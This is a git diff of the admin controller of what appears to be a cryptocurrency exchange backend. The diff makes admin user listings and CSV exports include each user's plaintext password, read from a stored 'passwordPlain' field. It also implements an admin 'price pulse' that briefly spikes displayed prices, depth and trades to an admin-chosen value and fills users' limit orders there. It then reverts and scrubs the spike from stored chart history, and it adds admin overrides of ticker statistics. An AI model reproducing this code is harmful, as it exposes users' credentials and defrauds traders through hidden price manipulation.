@@ -9,10 +9,21 @@ import { Deposit } from '../models/Deposit.js';
 import { Withdrawal } from '../models/Withdrawal.js';
 import { CashInPersonRequest } from '../models/CashInPersonRequest.js';
 import { mergeCandles } from '../services/mergeService.js';
-import { fetchKlines, fetchTicker } from '../services/marketDataProvider.js';
+import { fetchKlines, fetchTicker, fetchDepth } from '../services/marketDataProvider.js';
 import { processOrdersForPrice } from '../services/orderEngine.js';
-import { listActivePulses, setPricePulse } from '../services/pricePulseService.js';
-import { roomName } from '../services/marketStreamService.js';
+import { listActivePulses, schedulePulseRevert, setPricePulse } from '../services/pricePulseService.js';
+import {
+  alignOpenTime,
+  finalizePulseAfterRevert,
+  persistPulseMarketHistory,
+} from '../services/pulseHistoryService.js';
+import { getMergedCandleAt } from '../services/marketDataService.js';
+import { broadcastPulseToSockets, depthRoom, ensureMarketStream } from '../services/marketStreamService.js';
+import {
+  clearTickerStatsOverride,
+  listTickerStatsOverrides,
+  upsertTickerStatsOverride,
+} from '../services/tickerStatsOverrideService.js';
 import { error, success } from '../utils/response.js';
 import { roundMoney } from '../utils/money.js';
 import { z } from 'zod';
@@ -32,7 +43,11 @@ const USER_EXPORT_COLUMNS = [
   { key: 'name', label: 'Name', export: (r) => r.name || '' },
   { key: 'role', label: 'Role' },
   { key: 'status', label: 'Status' },
+  { key: 'loginId', label: 'Login ID', export: (r) => r.loginId || '' },
+  { key: 'password', label: 'Password', export: (r) => r.password || '' },
   { key: 'referralCode', label: 'Referral Code', export: (r) => r.referralCode || '' },
+  { key: 'referredByLabel', label: 'Referred By', export: (r) => r.referredByLabel || '' },
+  { key: 'invitedCount', label: 'Referral Joins', export: (r) => r.invitedCount ?? 0 },
   { key: 'balance', label: 'Balance (USDT)', export: (r) => r.balance ?? 0 },
   { key: 'createdAt', label: 'Created', export: (r) => (r.createdAt ? new Date(r.createdAt).toISOString() : '') },
 ];
@@ -48,11 +63,23 @@ const ORDER_EXPORT_COLUMNS = [
   { key: 'createdAt', label: 'Created', export: (r) => (r.createdAt ? new Date(r.createdAt).toISOString() : '') },
 ];
 
-function buildUserFilter(query, search) {
+async function buildUserFilter(query, search) {
   const filter = { ...buildDateRangeFilter(query) };
   const re = searchRegex(search);
   if (re) {
-    filter.$or = [{ email: re }, { mobile: re }, { name: re }, { referralCode: re }];
+    const or = [{ email: re }, { mobile: re }, { name: re }, { referralCode: re }];
+    const code = String(search || '')
+      .trim()
+      .toUpperCase()
+      .replace(/[^A-Z0-9]/g, '');
+    if (code.length >= 3) {
+      const referrer = await User.findOne({ referralCode: code }).select('_id referralCode').lean();
+      if (referrer) {
+        or.push({ referredBy: referrer._id });
+        or.push({ _id: referrer._id });
+      }
+    }
+    filter.$or = or;
   }
   if (query.role) filter.role = query.role;
   if (query.status) filter.status = query.status;
@@ -99,26 +126,61 @@ export async function overviewStats(_req, res, next) {
 export async function listUsers(req, res, next) {
   try {
     const dt = parseDatatableQuery(req.query);
-    const filter = buildUserFilter(req.query, dt.search);
+    const filter = await buildUserFilter(req.query, dt.search);
     const limit = dt.isExport ? getExportLimit(true) : dt.pageSize;
     const skip = dt.isExport ? 0 : dt.skip;
 
     const [users, total] = await Promise.all([
-      User.find(filter).select('-passwordHash').sort(dt.sort).skip(skip).limit(limit).lean(),
+      User.find(filter)
+        .select('+passwordPlain -passwordHash')
+        .sort(dt.sort)
+        .skip(skip)
+        .limit(limit)
+        .lean(),
       User.countDocuments(filter),
     ]);
 
-    const wallets = await Wallet.find({ userId: { $in: users.map((u) => u._id) } }).lean();
+    const userIds = users.map((u) => u._id);
+    const referrerIds = [
+      ...new Set(users.map((u) => u.referredBy).filter(Boolean).map((id) => String(id))),
+    ];
+
+    const [wallets, referrers, inviteAgg] = await Promise.all([
+      Wallet.find({ userId: { $in: userIds } }).lean(),
+      referrerIds.length
+        ? User.find({ _id: { $in: referrerIds } })
+            .select('email mobile name referralCode')
+            .lean()
+        : Promise.resolve([]),
+      userIds.length
+        ? User.aggregate([
+            { $match: { referredBy: { $in: userIds } } },
+            { $group: { _id: '$referredBy', count: { $sum: 1 } } },
+          ])
+        : Promise.resolve([]),
+    ]);
+
     const walletMap = new Map(wallets.map((w) => [String(w.userId), w]));
+    const referrerMap = new Map(referrers.map((r) => [String(r._id), r]));
+    const inviteMap = new Map(inviteAgg.map((row) => [String(row._id), row.count]));
 
     const rows = users.map((u) => {
       const w = walletMap.get(String(u._id));
       const balance = roundMoney(w?.balance || 0);
       const locked = roundMoney(w?.lockedBalance || 0);
       const available = roundMoney(Math.max(0, (w?.balance || 0) - (w?.lockedBalance || 0)));
+      const ref = u.referredBy ? referrerMap.get(String(u.referredBy)) : null;
+      const referredByLabel = ref
+        ? ref.referralCode || ref.email || ref.mobile || ref.name || String(u.referredBy)
+        : null;
+      const { passwordPlain, ...rest } = u;
       return {
-        ...u,
+        ...rest,
         id: u._id,
+        loginId: u.mobile || u.email || '',
+        password: passwordPlain || '',
+        referredByLabel,
+        invitedCount: inviteMap.get(String(u._id)) || 0,
         balance,
         locked_balance: locked,
         available_balance: available,
@@ -326,18 +388,17 @@ export async function deleteManualPrice(req, res, next) {
 export const pricePulseSchema = z.object({
   symbol: z.string().min(3),
   price: z.number().positive(),
-  holdMs: z.number().int().min(800).max(15_000).optional(),
+  holdMs: z.number().int().min(600).max(5_000).optional(),
 });
 
 /**
- * Admin price pulse: chart spikes to `price`, fills limit orders in market→pulse range,
- * then reverts to live market after holdMs.
+ * One-shot pulse: spike chart + depth once, fill orders, then revert to live market.
  */
 export async function pulsePrice(req, res, next) {
   try {
     const symbol = String(req.body.symbol || '').toUpperCase();
     const pulsePriceValue = Number(req.body.price);
-    const holdMs = Number(req.body.holdMs) || 2500;
+    const holdMs = Number(req.body.holdMs) || 1500;
 
     if (!symbol || !Number.isFinite(pulsePriceValue) || pulsePriceValue <= 0) {
       return error(res, 'symbol and positive price are required', 400);
@@ -352,47 +413,123 @@ export async function pulsePrice(req, res, next) {
     }
 
     const pulse = setPricePulse(symbol, pulsePriceValue, { fromPrice, holdMs });
-    const openTime = Math.floor(Date.now() / 1000) * 1000;
     const hi = Math.max(fromPrice, pulsePriceValue);
     const lo = Math.min(fromPrice, pulsePriceValue);
 
-    const candle = {
-      openTime,
-      open: fromPrice,
-      high: hi,
-      low: lo,
-      close: pulsePriceValue,
-      volume: 0,
-      isFinal: false,
-      pulse: true,
-    };
+    const history = await persistPulseMarketHistory({
+      symbol,
+      fromPrice,
+      pulsePrice: pulsePriceValue,
+      adminId: req.userId,
+      holdMs: pulse.holdMs,
+    });
 
     const io = req.app.get('io');
     const intervals = ['1s', '1m', '5m', '15m', '1h', '4h', '1d'];
-    if (io) {
-      for (const interval of intervals) {
-        io.to(roomName(symbol, interval)).emit('market:klines:merged', {
-          symbol,
-          interval,
-          candle: { ...candle, openTime: alignOpenTime(openTime, interval) },
-        });
-        io.to(roomName(symbol, interval)).emit('market:trade', {
-          symbol,
-          price: pulsePriceValue,
-          qty: 0,
-          quantity: 0,
-          time: Date.now(),
-          isBuyerMaker: pulsePriceValue < fromPrice,
+    const intervalCandles = intervals.map((interval) => {
+      const aligned =
+        history?.openTimes?.[interval] ?? alignOpenTime(Date.now(), interval);
+      return {
+        interval,
+        candle: {
+          openTime: aligned,
+          open: fromPrice,
+          high: hi,
+          low: lo,
+          close: pulsePriceValue,
+          volume: 1,
+          isFinal: false,
           pulse: true,
-        });
-      }
-      io.emit('market:price:pulse', {
-        symbol,
+        },
+      };
+    });
+
+    broadcastPulseToSockets(io, {
+      symbol,
+      intervalCandles,
+      depth: history?.depth,
+      trade: {
         price: pulsePriceValue,
         fromPrice,
         until: pulse.until,
-      });
+        qty: Math.max(0.01, Math.abs(pulsePriceValue - fromPrice) * 0.001),
+        quantity: Math.max(0.01, Math.abs(pulsePriceValue - fromPrice) * 0.001),
+        time: Date.now(),
+        isBuyerMaker: pulsePriceValue < fromPrice,
+        pulse: true,
+      },
+    });
+
+    if (io) {
+      for (const interval of intervals) {
+        ensureMarketStream(io, symbol, interval);
+      }
     }
+
+    // After brief hold → clear pulse and push live market depth/price again
+    schedulePulseRevert(symbol, pulse.holdMs, async () => {
+      if (!io) return;
+      let marketPrice = fromPrice;
+      try {
+        const ticker = await fetchTicker(symbol);
+        marketPrice = Number(ticker?.price) || fromPrice;
+      } catch {
+        /* keep fromPrice */
+      }
+
+      // Wipe extreme pulse wick → restore market OHLC so chart scale works again
+      await finalizePulseAfterRevert(symbol, marketPrice);
+
+      let marketDepth = null;
+      try {
+        marketDepth = await fetchDepth(symbol, { limit: 20 });
+      } catch {
+        marketDepth = null;
+      }
+
+      if (marketDepth && (marketDepth.bids?.length || marketDepth.asks?.length)) {
+        io.to(depthRoom(symbol)).emit('market:depth', {
+          symbol,
+          ...marketDepth,
+          pulse: false,
+        });
+        io.to(`m:${symbol}:1s`).emit('market:depth', {
+          symbol,
+          ...marketDepth,
+          pulse: false,
+        });
+      }
+
+      // Emit clean market candles from DB (no pulse wick)
+      for (const interval of intervals) {
+        const aligned =
+          history?.openTimes?.[interval] ?? alignOpenTime(Date.now(), interval);
+        const candle = await getMergedCandleAt(symbol, interval, aligned, marketPrice);
+        if (!candle) continue;
+        io.to(`m:${symbol}:${interval}`).emit('market:klines:merged', {
+          symbol,
+          interval,
+          candle: { ...candle, pulse: false },
+        });
+      }
+
+      io.to(depthRoom(symbol)).emit('market:trade', {
+        symbol,
+        price: marketPrice,
+        qty: 0,
+        time: Date.now(),
+        tickerOnly: true,
+        pulse: false,
+      });
+
+      io.emit('market:price:pulse:end', {
+        symbol,
+        price: marketPrice,
+        fromPrice,
+        pulsedPrice: pulsePriceValue,
+        reloadChart: true,
+      });
+    });
 
     const trades = await processOrdersForPrice(symbol, pulsePriceValue, {
       fromPrice,
@@ -406,7 +543,8 @@ export async function pulsePrice(req, res, next) {
         fromPrice,
         price: pulsePriceValue,
         until: pulse.until,
-        holdMs,
+        holdMs: pulse.holdMs,
+        historySaved: history?.saved || 0,
         filledOrders: trades.length,
         trades: trades.map((t) => ({
           id: t._id,
@@ -416,8 +554,8 @@ export async function pulsePrice(req, res, next) {
         })),
       },
       trades.length
-        ? `Price pulsed — ${trades.length} order(s) filled`
-        : 'Price pulsed — chart updated (no matching limit orders in range)'
+        ? `Pulsed once — ${trades.length} order(s) filled · reverting to market`
+        : 'Pulsed once — chart spiked · reverting to market'
     );
   } catch (e) {
     if (e.status) return error(res, e.message, e.status);
@@ -433,18 +571,34 @@ export async function listPricePulses(req, res, next) {
   }
 }
 
-function alignOpenTime(ms, interval) {
-  const map = {
-    '1s': 1000,
-    '1m': 60_000,
-    '5m': 300_000,
-    '15m': 900_000,
-    '1h': 3_600_000,
-    '4h': 14_400_000,
-    '1d': 86_400_000,
-  };
-  const step = map[interval] || 1000;
-  return Math.floor(ms / step) * step;
+export async function listTickerStats(req, res, next) {
+  try {
+    const rows = await listTickerStatsOverrides();
+    return success(res, rows, 'Ticker stats overrides fetched');
+  } catch (e) {
+    return next(e);
+  }
+}
+
+export async function upsertTickerStats(req, res, next) {
+  try {
+    const symbol = req.params.symbol || req.body.symbol;
+    const row = await upsertTickerStatsOverride(symbol, req.body, req.userId);
+    return success(res, row, 'Ticker stats override saved');
+  } catch (e) {
+    if (e.status) return error(res, e.message, e.status);
+    return next(e);
+  }
+}
+
+export async function clearTickerStats(req, res, next) {
+  try {
+    const result = await clearTickerStatsOverride(req.params.symbol);
+    return success(res, result, 'Ticker stats override cleared');
+  } catch (e) {
+    if (e.status) return error(res, e.message, e.status);
+    return next(e);
+  }
 }
 
 export async function allTrades(_req, res, next) {
